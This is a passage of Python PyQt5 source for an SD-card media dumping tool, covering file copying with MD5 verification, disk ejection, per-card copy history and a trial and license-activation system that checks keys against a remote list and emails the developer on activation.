                
                source_file = file_info['source']
                relative_path = os.path.relpath(source_file, source_folders[0])
                for s_folder in source_folders:
                    if source_file.startswith(s_folder):
                        relative_path = os.path.relpath(source_file, s_folder)
                        break
                dest_file = os.path.join(final_destination, relative_path)

                try:
                    os.makedirs(os.path.dirname(dest_file), exist_ok=True)
                    shutil.copy2(source_file, dest_file)
                    self.log_message.emit(f"Copied: {os.path.basename(source_file)}")
                    
                    completed_count += 1
                    bytes_copied += file_info['size']
                    
                    percent = int((completed_count / len(all_files_to_copy)) * 100)
                    status_text = f"Copying {completed_count} of {len(all_files_to_copy)} files... ({percent}%)"
                    self.progress_updated.emit(percent, status_text)
                    
                    elapsed_time = time.time() - start_time
                    if elapsed_time > 0:
                        speed = bytes_copied / elapsed_time
                        self.speed_updated.emit(f"{speed / (1024*1024):.2f} MB/s" if speed > 1024*1024 else f"{speed / 1024:.2f} KB/s")

                except Exception as e:
                    self.log_message.emit(f"ERROR copying file {os.path.basename(source_file)}: {e}")
            
        except Exception as e:
            self.log_message.emit(f"FATAL ERROR during copy: {e}")
            self.copy_finished.emit("Error", completed_count, os.path.basename(final_destination), {})
            return

        self.speed_updated.emit("")
        if self.user_cancelled:
            self.copy_finished.emit("Canceled", completed_count, os.path.basename(final_destination), {})
        else:
            extension_summary = {}
            for file_info in all_files_to_copy:
                ext = os.path.splitext(file_info['source'])[1].upper().replace('.', '')
                if ext:
                    extension_summary[ext] = extension_summary.get(ext, 0) + 1

            self.progress_updated.emit(100, f"Completed copy process.")
            for i, item in enumerate(all_files_to_copy):
                s_file = item['source']
                rel_p = os.path.relpath(s_file, source_folders[0])
                for s_folder in source_folders:
                    if s_file.startswith(s_folder):
                        rel_p = os.path.relpath(s_file, s_folder)
                        break
                all_files_to_copy[i]['dest'] = os.path.join(final_destination, rel_p)

            if verify_after:
                verified = self._run_verification(all_files_to_copy)
                status = "Completed & Verified" if verified else "Verification Failed"
                self.copy_finished.emit(status, completed_count, os.path.basename(final_destination), extension_summary)
            else:
                self.copy_finished.emit("Completed", completed_count, os.path.basename(final_destination), extension_summary)

    def _run_verification(self, copied_items):
        self.log_message.emit("Starting file verification...")
        self.verification_update.emit('Verifying copied files...')
        total = len(copied_items)
        verified_count = 0
        for item in copied_items:
            if self.user_cancelled:
                self.log_message.emit("Verification cancelled.")
                return False
            
            verified_count += 1
            source_file_path = item['source']
            dest_file_path = item['dest']
            rel_filename = os.path.basename(source_file_path)
            
            self.verification_update.emit(f'Verifying {verified_count}/{total}: {rel_filename}')
            
            if not os.path.exists(dest_file_path):
                self.log_message.emit(f"VERIFY FAILED: File '{rel_filename}' was not found in destination.")
                return False
            source_hash = self._calculate_md5(source_file_path)
            dest_hash = self._calculate_md5(dest_file_path)
            if source_hash != dest_hash:
                self.log_message.emit(f"VERIFY FAILED: Checksum mismatch for '{rel_filename}'.")
                return False
        self.log_message.emit("Verification successful: All files match.")
        self.verification_update.emit('Verification Complete!')
        return True

    def _calculate_md5(self, filepath):
        hash_md5 = hashlib.md5()
        try:
            with open(filepath, "rb") as f:
                for chunk in iter(lambda: f.read(4096), b""):
                    if self.user_cancelled: return None
                    hash_md5.update(chunk)
            return hash_md5.hexdigest()
        except IOError:
            self.log_message.emit(f"ERROR: Could not read file for hashing: {filepath}")
            return None

    def cancel(self):
        self.log_message.emit("Cancel signal received. Stopping...")
        self.speed_updated.emit("")
        self.user_cancelled = True
        self.pause_event.set()

    @pyqtSlot()
    def toggle_pause_resume(self):
        self.is_paused = not self.is_paused
        if self.is_paused:
            self.pause_event.clear()
            self.log_message.emit("Paused copy process.")
        else:
            self.pause_event.set()
            self.log_message.emit("Resumed copy process.")
        self.pause_state_changed.emit(self.is_paused)


    @pyqtSlot(str)
    def force_eject_disk(self, volume_path):
        """Main entry point for ejecting a disk."""
        try:
            if IS_WINDOWS:
                self._eject_windows(volume_path)
            elif IS_MAC:
                self._eject_mac(volume_path)
            else:
                self.eject_failed.emit(volume_path, "Eject function not supported on this OS.")
        except Exception as e:
            self.eject_failed.emit(volume_path, f"An unexpected error occurred during eject: {e}")

    def _find_windows_locking_processes(self, drive_path):
        """Uses psutil to find processes with open file handles on the specified drive."""
        self.status_updated.emit(f"Scanning for programs using {drive_path}...")
        locking_processes = set()
        drive_path_prefix = drive_path.rstrip('\\')
        for proc in psutil.process_iter(['pid', 'name', 'open_files']):
            try:
                open_files = proc.info.get('open_files')
                if not open_files:
                    continue
                for file_handle in open_files:
                    if file_handle.path.startswith(drive_path_prefix):
                        locking_processes.add(proc.info['name'])
            except (psutil.NoSuchProcess, psutil.AccessDenied, TypeError):
                continue
        return list(locking_processes)

    def _eject_mac(self, volume_path):
        """Ejects a disk on macOS using diskutil."""
        if not os.path.isdir(volume_path):
            self.eject_failed.emit(volume_path, f"Volume '{volume_path}' not found.")
            return

        try:
            self.status_updated.emit("Getting disk identifier...")
            import plistlib
            info_process = subprocess.run(
                ['diskutil', 'info', '-plist', volume_path],
                check=True, capture_output=True, timeout=5
            )
            info = plistlib.loads(info_process.stdout)
            device_identifier = info.get("ParentWholeDisk") or info.get("DeviceIdentifier")

            if not device_identifier:
                raise ValueError("Could not determine disk identifier.")

            self.status_updated.emit(f"Unmounting {device_identifier}...")
            subprocess.run(
                ["diskutil", "unmountDisk", "force", device_identifier],
                check=True, capture_output=True, text=True, timeout=10
            )

            self.status_updated.emit(f"Ejecting {device_identifier}...")
            subprocess.run(
                ["diskutil", "eject", device_identifier],
                check=True, capture_output=True, text=True, timeout=10
            )

            self.eject_succeeded.emit(os.path.basename(volume_path))

        except (subprocess.CalledProcessError, subprocess.TimeoutExpired, ValueError, FileNotFoundError) as e:
            error_message = f"Could not eject '{os.path.basename(volume_path)}'."
            if isinstance(e, subprocess.CalledProcessError):
                error_message += f"\nReason: {e.stdout.strip()}{e.stderr.strip()}"
            else:
                error_message += f"\nReason: {e}"
            self.eject_failed.emit(volume_path, error_message)

    def _perform_windows_api_eject(self, drive_letter):
        """The core Win32 API ejection logic. Returns True on success."""
        open_existing = 0x3
        ioctl_storage_eject_media = 0x002D4808
        fsctl_lock_volume = 0x00090018
        fsctl_dismount_volume = 0x00090020
        generic_read_write = 0xC0000000
        h_vol = None

        try:
            h_vol = ctypes.windll.kernel32.CreateFileW(
                f'\\\\.\\{drive_letter}:', generic_read_write, 0, None, open_existing, 0, None
            )
            if h_vol == -1: return False

            ctypes.windll.kernel32.DeviceIoControl(h_vol, fsctl_lock_volume, None, 0, None, 0, ctypes.byref(ctypes.c_ulong()), None)
            ctypes.windll.kernel32.DeviceIoControl(h_vol, fsctl_dismount_volume, None, 0, None, 0, ctypes.byref(ctypes.c_ulong()), None)
            ctypes.windll.kernel32.DeviceIoControl(h_vol, ioctl_storage_eject_media, None, 0, None, 0, ctypes.byref(ctypes.c_ulong()), None)
            return True
        except Exception:
            return False
        finally:
            if h_vol is not None:
                ctypes.windll.kernel32.CloseHandle(h_vol)


class SDDumpToolPyQt(QMainWindow):
    start_copy_signal = pyqtSignal(list, str, bool, str, bool)
    back_to_project_manager = pyqtSignal()
    deactivation_signal = pyqtSignal()
    theme_change_request = pyqtSignal(bool)

    def __init__(self, project_settings, app_controller):
        super().__init__()
        self.app_controller = app_controller
        self.project_name = project_settings.get('name')
        self.destination_base_dir = project_settings.get('location')
        self.copy_mode = project_settings.get('copy_mode', 'Copy Photo and Video')
        self.sd_card_path, self.sd_card_name, self.sd_card_id = None, None, None
        self.is_copying = False
        self.found_folders_paths = []
        self.history_file = os.path.expanduser("~/.lovewave_dumper_history.json")
        self.copy_history = {}
        os.makedirs(self.destination_base_dir, exist_ok=True)
        self.init_ui()
        self.load_history()
        self.setup_threads()
        self.deactivation_signal.connect(self._handle_deactivation)

    def set_buttons_enabled(self, enabled):
        for widget in [self.auto_copy_checkbox, self.continuous_dump_checkbox,
                       self.verify_checkbox, self.project_manager_button,
                       self.view_history_button, self.toggle_log_button,
                       self.clear_log_button, self.copy_button,
                       self.view_contents_button, self.dark_mode_checkbox,
                       self.disable_success_popup_checkbox]:
            widget.setEnabled(enabled)
        if not enabled:
            self.pause_button.setEnabled(False)
            self.cancel_button.setEnabled(False)


    @pyqtSlot()
    def _handle_deactivation(self):
        self.set_buttons_enabled(False)
        self.update_license_widgets()
        QMessageBox.critical(self, "License Deactivated", "This license key has been remotely deactivated. Please contact support.")


    def init_ui(self):
        self.setWindowTitle("Lovewave Media Dumper (Windows)")
        try:
            icon_path = resource_path('lovewave.png')
            if os.path.exists(icon_path): self.setWindowIcon(QIcon(icon_path))
        except Exception: print("Warning: 'lovewave.png' not found.")
        
        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        self.main_layout = QVBoxLayout(self.central_widget)
        self.main_layout.setContentsMargins(21, 21, 21, 21)
        self.main_layout.setSpacing(5)

        title_label = QLabel(self.project_name.upper())
        title_label.setFont(QFont("Helvetica", 16, QFont.Bold))
        title_label.setAlignment(Qt.AlignCenter)
        self.main_layout.addWidget(title_label)
        
        self.header_dest_label = QLabel(f"Project Destination: {self.destination_base_dir}")
        self.header_dest_label.setFont(QFont("Helvetica", 9))
        self.header_dest_label.setWordWrap(True)
        self.header_dest_label.setAlignment(Qt.AlignCenter)
        self.main_layout.addWidget(self.header_dest_label)

        self.copy_mode_label = QLabel(f"Mode: {self.copy_mode}")
        self.copy_mode_label.setObjectName("copyModeLabel")
        self.copy_mode_label.setFont(QFont("Helvetica", 9, QFont.Bold))
        self.copy_mode_label.setAlignment(Qt.AlignCenter)
        self.main_layout.addWidget(self.copy_mode_label)
        # Add a separator line below Copy Mode
        line_separator = QFrame()
        line_separator.setFrameShape(QFrame.HLine)
        line_separator.setFrameShadow(QFrame.Sunken)
        self.main_layout.addWidget(line_separator)

        options_container = QWidget()
        options_layout = QVBoxLayout(options_container)
        options_layout.setContentsMargins(20, 5, 20, 5)
        options_layout.setSpacing(4)

        self.auto_copy_checkbox = QCheckBox("Automatically copy new dumps for this card")
        self.auto_copy_checkbox.setChecked(True)
        self.disable_success_popup_checkbox = QCheckBox("Disable success copy notification")
        self.continuous_dump_checkbox = QCheckBox("Enable continuous folder dumping method")
        self.verify_checkbox = QCheckBox("Verify files after copy (slower)")
        self.dark_mode_checkbox = QCheckBox("Enable Dark Mode")
        
        current_settings = load_ui_settings()
        self.dark_mode_checkbox.setChecked(current_settings.get("theme", "dark") == "dark")
        self.dark_mode_checkbox.toggled.connect(self.theme_change_request)
        self.theme_change_request.connect(self.app_controller.set_theme)
        self.auto_copy_checkbox.toggled.connect(self.on_auto_copy_toggle)

        options_layout.addWidget(self.auto_copy_checkbox)
        options_layout.addWidget(self.disable_success_popup_checkbox)
        options_layout.addWidget(self.continuous_dump_checkbox)
        options_layout.addWidget(self.verify_checkbox)
        options_layout.addWidget(self.dark_mode_checkbox)
        self.main_layout.addWidget(options_container)
        
        separator = QFrame(); separator.setFrameShape(QFrame.HLine); separator.setFrameShadow(QFrame.Sunken)
        self.main_layout.addWidget(separator)
        
        status_container = QWidget()
        status_layout = QVBoxLayout(status_container)
        status_layout.setContentsMargins(0,0,0,0)
        status_layout.setSpacing(6)

        self.status_label = QLabel("Please insert an SD card...")
        self.status_label.setObjectName("statusLabelWaiting")
        self.status_label.setFont(QFont("Helvetica", 14))
        self.status_label.setAlignment(Qt.AlignCenter)
        status_layout.addWidget(self.status_label)
        
        self.detected_card_label = QLabel("Detected Card: None")
        self.detected_card_label.setFont(QFont("Helvetica", 10))
        self.detected_card_label.setAlignment(Qt.AlignCenter)
        status_layout.addWidget(self.detected_card_label)

        self.history_label = QLabel("")
        self.history_label.setFont(QFont("Helvetica", 10, QFont.StyleItalic))
        self.history_label.setAlignment(Qt.AlignCenter)
        self.history_label.setWordWrap(True)
        self.history_label.setMinimumHeight(24)
        status_layout.addWidget(self.history_label)
        self.main_layout.addWidget(status_container)

        self.copy_button = QPushButton("Create New Dump...")
        self.copy_button.setFont(QFont("Helvetica", 12, QFont.Bold))
        self.copy_button.setEnabled(False)
        self.copy_button.clicked.connect(self.start_manual_copy)
        self.copy_button.setMinimumHeight(36)
        self.main_layout.addWidget(self.copy_button, 0, Qt.AlignHCenter)

        control_layout = QHBoxLayout()
        control_layout.setSpacing(10)
        self.pause_button = QPushButton("Pause"); self.pause_button.setEnabled(False)
        self.pause_button.clicked.connect(self.toggle_pause_resume)
        self.cancel_button = QPushButton("Cancel"); self.cancel_button.setEnabled(False)
        self.cancel_button.clicked.connect(self.cancel_copy)
        control_layout.addStretch(); control_layout.addWidget(self.pause_button)
        control_layout.addWidget(self.cancel_button); control_layout.addStretch()
        self.main_layout.addLayout(control_layout)

        open_folder_text = "Open in Explorer" if IS_WINDOWS else "Open in Finder"
        self.view_contents_button = QPushButton(open_folder_text)
        self.view_contents_button.setObjectName("viewContentsButton")
        self.view_contents_button.setEnabled(False)
        self.view_contents_button.clicked.connect(self.show_sd_card_contents)
        self.main_layout.addWidget(self.view_contents_button, 0, Qt.AlignCenter)

        # --- Bottom Stacked Widget for Progress/Log ---
        self.bottom_stacked_widget = QStackedWidget()
        self.main_layout.addWidget(self.bottom_stacked_widget)
        
        progress_widget = QWidget()
        progress_layout = QVBoxLayout(progress_widget)
        progress_layout.setContentsMargins(5, 5, 5, 5)
        self.file_count_label = QLabel("Ready to copy files.")
        self.file_count_label.setFont(QFont("Helvetica", 11, QFont.Bold))
        self.file_count_label.setAlignment(Qt.AlignHCenter | Qt.AlignTop)
        self.file_count_label.setMinimumHeight(24)
        self.progressbar = QProgressBar()
        self.progressbar.setTextVisible(False)
        self.speed_label = QLabel("")
        font = self.speed_label.font(); font.setPointSize(9); self.speed_label.setFont(font)
        self.speed_label.setAlignment(Qt.AlignRight | Qt.AlignVCenter)
        progress_layout.addWidget(self.file_count_label)
        progress_bar_layout = QHBoxLayout()
        progress_bar_layout.addWidget(self.progressbar)
        progress_bar_layout.addWidget(self.speed_label)
        progress_layout.addLayout(progress_bar_layout)
        self.bottom_stacked_widget.addWidget(progress_widget)

        log_widget = QWidget()
        log_layout = QVBoxLayout(log_widget)
        log_layout.setContentsMargins(5, 5, 5, 5)
        log_header_layout = QHBoxLayout()
        log_label = QLabel("Activity Log"); log_label.setFont(QFont("Helvetica", 11, QFont.Bold))
        self.clear_log_button = QPushButton("Clear Log")
        self.clear_log_button.setObjectName("clearLogButton")
        self.clear_log_button.clicked.connect(self.clear_activity_log)
        log_header_layout.addWidget(log_label)
        log_header_layout.addStretch()
        log_header_layout.addWidget(self.clear_log_button)
        log_layout.addLayout(log_header_layout)
        self.log_text = QTextEdit(); self.log_text.setReadOnly(True); self.log_text.setFont(QFont("Menlo", 9))
        log_layout.addWidget(self.log_text)
        self.bottom_stacked_widget.addWidget(log_widget)
        
        self.bottom_bar_layout = QHBoxLayout()
        self.main_layout.addLayout(self.bottom_bar_layout)
        
        self.toggle_log_button = QPushButton("Show Log"); self.toggle_log_button.setCheckable(True)
        self.toggle_log_button.toggled.connect(self.toggle_log_visibility)
        self.log_shortcut = QShortcut(QKeySequence("Ctrl+1"), self)
        self.log_shortcut.activated.connect(self.toggle_log_button.click)
        
        self.project_manager_button = QPushButton("Project Manager")
        self.project_manager_button.clicked.connect(self.go_to_project_manager)
        self.view_history_button = QPushButton("View Card History")
        self.view_history_button.clicked.connect(self.show_history_dialog)

        self.bottom_bar_layout.addWidget(self.toggle_log_button)
        self.bottom_bar_layout.addWidget(self.project_manager_button)
        self.bottom_bar_layout.addWidget(self.view_history_button)
        self.bottom_bar_layout.addStretch()

        self.disk_space_label = QLabel("..."); self.disk_space_label.setObjectName("diskSpaceLabel")
        self.disk_space_label.setFont(QFont("Helvetica", 9, QFont.Bold))
        self.bottom_bar_layout.addWidget(self.disk_space_label)

        self.license_input = QLineEdit(); self.license_input.setPlaceholderText("Enter License Code")
        self.license_button = QPushButton("Activate"); self.license_button.clicked.connect(self.activate_license)
        self.license_layout = QHBoxLayout()
        self.license_layout.addWidget(self.license_input)
        self.license_layout.addWidget(self.license_button)
        self.main_layout.addLayout(self.license_layout)
        
        self.trial_status_label = QLabel(get_trial_remaining_text()); self.trial_status_label.setObjectName("trialStatusLabel")
        self.trial_status_label.setAlignment(Qt.AlignCenter)
        self.main_layout.addWidget(self.trial_status_label)
        
        # --- Final UI Setup ---
        self.toggle_log_visibility(False) # Set initial size
        if is_trial_expired():
            self.set_buttons_enabled(False)
            self.status_label.setText("Trial expired. Enter license to continue.")
            self.status_label.setObjectName("statusLabelError")
            self.license_input.setEnabled(True); self.license_button.setEnabled(True)
        else:
            self.set_buttons_enabled(True)
            for btn in [self.copy_button, self.view_contents_button]: btn.setEnabled(False)
        self.update_license_widgets()
        self._update_disk_space()
        self.log_message(f"Project '{self.project_name}' loaded. Destination: {self.destination_base_dir}")
        self._center_window()

    def _center_window(self):
        qr = self.frameGeometry()
        cp = QDesktopWidget().availableGeometry().center()
        qr.moveCenter(cp)
        self.move(qr.topLeft())

    def setup_threads(self):
        self.monitor_thread = QThread()
        self.monitor_worker = MonitorWorker()
        self.monitor_worker.moveToThread(self.monitor_thread)
        self.monitor_worker.card_detected.connect(self.on_card_detected)
        self.monitor_worker.card_removed.connect(self._reset_gui)
        self.monitor_worker.log_message.connect(self.log_message)
        self.monitor_thread.started.connect(self.monitor_worker.run)
        self.monitor_thread.start()
        
        self.copy_thread = QThread()
        self.copy_worker = CopyWorker()
        self.copy_worker.moveToThread(self.copy_thread)
        self.copy_worker.progress_updated.connect(self._update_progress_display)
        self.copy_worker.speed_updated.connect(self.update_speed_label)
        self.copy_worker.copy_finished.connect(self.on_copy_finished)
        self.copy_worker.log_message.connect(self.log_message)
        self.copy_worker.pause_state_changed.connect(self.update_pause_button_text)
        self.copy_worker.verification_update.connect(self.status_label.setText)
        self.start_copy_signal.connect(self.copy_worker.start_operation)
        self.copy_thread.start()


    def go_to_project_manager(self):
        if self.is_copying:
            QMessageBox.warning(self, "Copy in Progress", "Please cancel or wait for the current copy to finish before returning to the Project Manager.")
            return
        self.back_to_project_manager.emit()
        self.close()

    def _play_sound(self, sound_type):
        try:
            if IS_MAC:
                sound_map = {"success": "/System/Library/Sounds/Submarine.aiff", "failure": "/System/Library/Sounds/Basso.aiff", "detection": "/System/Library/Sounds/Pop.aiff"}
                sound_file = sound_map.get(sound_type)
                if sound_file and os.path.exists(sound_file):
                    subprocess.run(["afplay", sound_file], timeout=2, check=True, capture_output=True)
            elif IS_WINDOWS:
                sound_map = {"success": "SystemAsterisk", "failure": "SystemHand", "detection": "SystemExclamation"}
                sound_name = sound_map.get(sound_type)
                if sound_name:
                    winsound.PlaySound(sound_name, winsound.SND_ALIAS)
        except Exception as e: 
            self.log_message(f"An unexpected error occurred while playing sound: {e}")

    def _scan_for_media_folders(self):
        self.found_folders_paths = []
        found_brands = set()
        if not self.sd_card_path: return

        card_root = self.sd_card_path # Path is already correct for both OS
        if not os.path.isdir(card_root): return

        for item in CAMERA_MEDIA_PATHS:
            scan_dir = card_root
            if item['base'] in ['DCIM', 'ROOT']:
                potential_dir = os.path.join(card_root, item['base'])
                if os.path.isdir(potential_dir): scan_dir = potential_dir
                elif item['base'] == 'DCIM': continue
            if not os.path.isdir(scan_dir): continue
            
            try:
                pattern = re.compile(item['pattern'], re.IGNORECASE)
                for folder_name in os.listdir(scan_dir):
                    full_path = os.path.join(scan_dir, folder_name)
                    if os.path.isdir(full_path) and pattern.match(folder_name):
                        brand_name = item['brand']
                        found_brands.add(brand_name)
                        
                        final_path_segment = SPECIAL_SUBPATHS.get(folder_name.upper())
                        full_final_path = ""
                        if final_path_segment:
                            full_final_path = os.path.join(scan_dir, final_path_segment)
                        else:
                            full_final_path = os.path.join(scan_dir, folder_name)
                            
                        if os.path.isdir(full_final_path) and full_final_path not in self.found_folders_paths:
                            self.found_folders_paths.append(full_final_path)
            except OSError as e:
                self.log_message(f"Error scanning directory {scan_dir}: {e}")
                continue
        if self.found_folders_paths:
            brands = sorted(list(found_brands))
            brand_list_string = '\n'.join([f'- {brand}' for brand in brands])
            self.log_message(f"Found media structures for:\n{brand_list_string}")
        else:
            self.log_message("No known camera folder structures found on this card.")

    def on_card_detected(self, card_id, card_name):
        if self.is_copying:
            self.log_message(f"Card '{card_name}' detected, but a copy is already in progress.")
            return
        if is_trial_expired():
            self.log_message(f"=================\nCard '{card_name}' detected, but trial is expired. Please activate.\nReinsert card after activation.\n=================")
            self.detected_card_label.setText(f"Detected Card: {card_name} (inactive)")
            return
        
        if IS_MAC:
             self.sd_card_path = os.path.join("/Volumes", card_name)
        elif IS_WINDOWS:
            # Extract path like 'E:\' from 'Volume Name (E:\)'
            match = re.search(r'\(([A-Z]:\\)\)', card_name)
            if match:
                self.sd_card_path = match.group(1)
            else: # Fallback if name is just the path
                self.sd_card_path = card_name

        self._play_sound("detection")
        self.sd_card_name = card_name
        self.sd_card_id = card_id
        self.detected_card_label.setText(f"Detected Card: {card_name}")
        self._scan_for_media_folders()
        if self.found_folders_paths:
            self.status_label.setText(f"SD Card '{card_name}' Ready!")
            self.status_label.setObjectName("statusLabelReady")
            self.copy_button.setEnabled(True)
        else:
            self.status_label.setText("Card connected, but no media structures found.")
            self.status_label.setObjectName("statusLabelError")
            self.copy_button.setEnabled(False)
        
        self.view_contents_button.setEnabled(True)
        if card_id in self.copy_history and self.copy_history[card_id]:
            last_op = self.copy_history[card_id][-1]
            last_destination = last_op.get('destination', '')
            if last_destination and os.path.isdir(os.path.dirname(last_destination)):
                self.history_label.setText(f"History: Last copy was to '.../{os.path.basename(os.path.dirname(last_destination))}'")
            if self.auto_copy_checkbox.isChecked():
                self.start_automated_copy()
        else:
            self.history_label.setText("No history for this card.")

    @pyqtSlot(int, str)
    def _update_progress_display(self, percent, status_text):
        self.progressbar.setValue(percent)
        self.file_count_label.setText(status_text)
    
    @pyqtSlot(str)
    def update_speed_label(self, speed_text):
        self.speed_label.setText(speed_text)

    @pyqtSlot(str, int, str, dict)
    def on_copy_finished(self, final_status, items_copied, dest_folder_name, extension_summary):
        self.is_copying = False
        self._update_disk_space()
        self.speed_label.setText("")
        if final_status.startswith("Completed"):
            self._play_sound("success")

            if extension_summary:
                summary_lines = ["\n--- File Summary ---"]
                for ext, count in sorted(extension_summary.items()):
                    summary_lines.append(f"{ext} = {count} Files")
                summary_lines.append("--------------------")
                summary_lines.append(f"Total Files Copied = {items_copied}")
                summary_lines.append("--------------------\n")
                self.log_message('\n'.join(summary_lines))

            if "No new files" not in final_status and not self.disable_success_popup_checkbox.isChecked():
                QMessageBox.information(self, "Copy Complete", f"{items_copied} files copied successfully to '{dest_folder_name}'.")
            
            self._reset_progress_display()


        elif final_status == "Canceled":
            self._play_sound("failure")
            QMessageBox.warning(self, "Cancelled", "The copy operation was cancelled.")
            self.file_count_label.setText("Copy process cancelled.")
            self.progressbar.setValue(0)
        else:
            self._play_sound("failure")
            QMessageBox.critical(self, "Operation Failed", f"The operation failed: {final_status}. Check log for details.")
            self.file_count_label.setText(f"Error: {final_status}")
            self.progressbar.setValue(0)
        
        if self.sd_card_id and self.sd_card_id in self.copy_history:
            try:
                self.copy_history[self.sd_card_id][-1]['status'] = final_status
                self.save_history()
            except IndexError: self.log_message("Could not update history for a finished copy.")
        
        self.log_message(f"Operation finished with status: {final_status}")
        self.log_message("========================================\n")
        
        self.pause_button.setEnabled(False)
        self.cancel_button.setEnabled(False)
        self.pause_button.setText("Pause")
        for widget in [self.auto_copy_checkbox, self.continuous_dump_checkbox, self.verify_checkbox, self.disable_success_popup_checkbox, self.dark_mode_checkbox]:
            widget.setEnabled(True)
        
        if self.sd_card_path and os.path.exists(self.sd_card_path):
            self.copy_button.setEnabled(True)
            self.view_contents_button.setEnabled(True)

    def _reset_gui(self):
        self.status_label.setText("Please insert an SD card...")
        self.status_label.setObjectName("statusLabelWaiting")
        self.detected_card_label.setText("Detected Card: None")
        self.history_label.setText("")
        self._reset_progress_display()
        self.sd_card_path, self.sd_card_name, self.sd_card_id, self.is_copying = None, None, None, False
        self.found_folders_paths = []
        for btn in [self.copy_button, self.pause_button, self.cancel_button, self.view_contents_button]:
            btn.setEnabled(False)
        if not is_trial_expired():
            for chk in [self.auto_copy_checkbox, self.verify_checkbox, self.continuous_dump_checkbox, self.disable_success_popup_checkbox, self.dark_mode_checkbox]:
                chk.setEnabled(True)

    def _reset_progress_display(self):
        self.progressbar.setValue(0)
        self.file_count_label.setText("Ready to copy files.")
        self.speed_label.setText("")


    def _update_disk_space(self):
        try:
            usage = shutil.disk_usage(self.destination_base_dir)
            free_space_gb = usage.free / (1024**3)
            self.disk_space_label.setText(f"{free_space_gb:.1f} GB Free")
        except FileNotFoundError: self.disk_space_label.setText("Destination Not Found")
        except Exception: self.disk_space_label.setText("Space Error")

    def start_copy_process(self, destination):
        if self.is_copying:
            self.log_message("A copy is already in progress.")
            return
        if not self.found_folders_paths:
            QMessageBox.warning(self, "No Media Found", "Cannot start copy because no media structures were found on the card.")
            return
        self.is_copying = True
        os.makedirs(destination, exist_ok=True)
        self._reset_progress_display()
        self.log_message("\n========================================")
        self.log_message(f"Starting copy to destination: {destination}")
        if self.sd_card_id:
            if self.sd_card_id not in self.copy_history: self.copy_history[self.sd_card_id] = []
            new_op = {"destination": destination, "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"), "status": "In Progress"}
            self.copy_history[self.sd_card_id].append(new_op)
            self.save_history()
        for widget in [self.copy_button, self.view_contents_button, self.auto_copy_checkbox, self.continuous_dump_checkbox, self.verify_checkbox, self.disable_success_popup_checkbox, self.dark_mode_checkbox]:
            widget.setEnabled(False)
        self.pause_button.setEnabled(True)
        self.cancel_button.setEnabled(True)
        is_continuous = self.continuous_dump_checkbox.isChecked()
        self.start_copy_signal.emit(self.found_folders_paths, destination, self.verify_checkbox.isChecked(), self.copy_mode, is_continuous)

    def start_manual_copy(self):
        subfolder_name, ok = QInputDialog.getText(self, "Create a Subfolder for the CARD", "Enter a name for the destination subfolder (e.g., 'Card 01 - Camera A'):")
        if not ok or not subfolder_name.strip(): return

        base_destination = os.path.join(self.destination_base_dir, subfolder_name.strip())
        self.start_copy_process(base_destination) # Always start the process with the base destination

    def start_automated_copy(self):
        card_id_for_copy = self.sd_card_id
        if not (card_id_for_copy and card_id_for_copy in self.copy_history and self.copy_history[card_id_for_copy]):
            return

        self.log_message("--- Auto-Copy Initiated ---")
        last_op = self.copy_history[card_id_for_copy][-1]
        last_destination = last_op.get('destination', '')

        if not last_destination or not os.path.isdir(os.path.dirname(last_destination)):
            self.log_message("Auto-copy failed: Last destination is invalid.")
            return

        base_destination = last_destination
        if os.path.basename(last_destination).lower().startswith('dump '):
            base_destination = os.path.dirname(last_destination)

        # Start the copy process using the base destination.
        # The background worker will handle creating a new "Dump X" folder if needed.
        self.start_copy_process(base_destination)

    def on_auto_copy_toggle(self, checked):
        if checked and self.sd_card_path and not self.is_copying and self.sd_card_id in self.copy_history:
            reply = QMessageBox.question(self, "Start Automatic Copy?", "Automation is on and a known card is detected. Start copying now?", QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
            if reply == QMessageBox.Yes: self.start_automated_copy()

    def cancel_copy(self):
        if self.is_copying and self.copy_worker:
            self.copy_worker.cancel()



    def toggle_pause_resume(self):
        if self.is_copying and self.copy_worker:
            self.copy_worker.toggle_pause_resume()

    @pyqtSlot(bool)
    def update_pause_button_text(self, is_paused):
        self.pause_button.setText("Resume" if is_paused else "Pause")

    def show_sd_card_contents(self):
        if self.sd_card_path:
            try:
                if IS_MAC:
                    subprocess.run(['open', self.sd_card_path])
                elif IS_WINDOWS:
                    os.startfile(self.sd_card_path)
            except Exception as e:
                self.log_message(f"Could not open file explorer: {e}")
                QMessageBox.warning(self, "Error", f"Could not open the folder at {self.sd_card_path}")

    def activate_license(self):
        # --- On-Demand Online Check ---
        # Fetch the latest license list ONLY when the user tries to activate.
        print("Connecting to server to verify license...")
        try:
            remote_config = fetch_remote_config()
            # Update globals with the fresh lists from the server
            global VALID_LICENSES, BLACKLISTED_KEYS
            VALID_LICENSES = remote_config.get("valid_licenses", [])
            BLACKLISTED_KEYS = remote_config.get("blacklisted_keys", [])
            print("License list updated from server.")
        except Exception as e:
            print(f"Could not connect to activation server. Using offline mode. Error: {e}")
            QMessageBox.warning(self, "Network Error", "Could not connect to the activation server.\nPlease check your internet connection or try an offline key.")
        
        code = self.license_input.text().strip()
        if code in VALID_LICENSES and code not in BLACKLISTED_KEYS:
            save_license_code(code)
            email_thread = threading.Thread(target=send_activation_email, args=("4lex.sia@gmail.com", code))
            email_thread.daemon = True
            email_thread.start()
            QMessageBox.information(self, "Activated", "License accepted. Full version unlocked.")
            self.setWindowTitle("Lovewave Media Dumper")
            self.update_license_widgets()
            self.trial_status_label.setText("")
            self.set_buttons_enabled(True)
            if self.sd_card_path and os.path.exists(self.sd_card_path):
                self.copy_button.setEnabled(bool(self.found_folders_paths))
                
                self.view_contents_button.setEnabled(True)
                if self.found_folders_paths:
                    self.status_label.setText(f"SD Card '{self.sd_card_name}' Ready!")
                    self.status_label.setObjectName("statusLabelReady")
                else:
                    self.status_label.setText("Card connected, but no media structures found.")
                    self.status_label.setObjectName("statusLabelError")
            else:
                self.status_label.setText("Please insert an SD card...")
                self.status_label.setObjectName("statusLabelWaiting")
                # CORRECTED: Removed self.eject_button which caused an error
                for btn in [self.copy_button, self.view_contents_button]:
                    btn.setEnabled(False)
        else:
            QMessageBox.warning(self, "Invalid", "The license code is invalid or has been deactivated.")

    def update_license_widgets(self):
        try:
            if not os.path.exists(LICENSE_FILE):
                self.license_input.show()
                self.license_button.show()
                self.trial_status_label.show()
                self.license_layout.setContentsMargins(0, 10, 0, 0)
                return

            with open(LICENSE_FILE, 'rb') as f:
                data = decrypt_data(f.read(), SECRET_KEY)

